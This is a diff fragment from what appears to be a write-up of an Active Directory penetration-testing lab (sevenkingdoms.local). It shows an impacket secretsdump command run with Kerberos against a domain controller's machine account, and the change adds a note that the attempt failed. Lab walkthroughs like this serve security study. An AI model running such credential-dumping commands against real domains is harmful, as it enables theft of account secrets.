@@ -96,7 +96,7 @@ Now let's try to dump the secrets !
 impacket-secretdump    north.sevenkingdoms.local/WINTERFELL$@winterfell.north.sevenkingdoms.local -k -no-pass
 ```
 
-
+It didn't work. I have the same weird error.
 
 
 
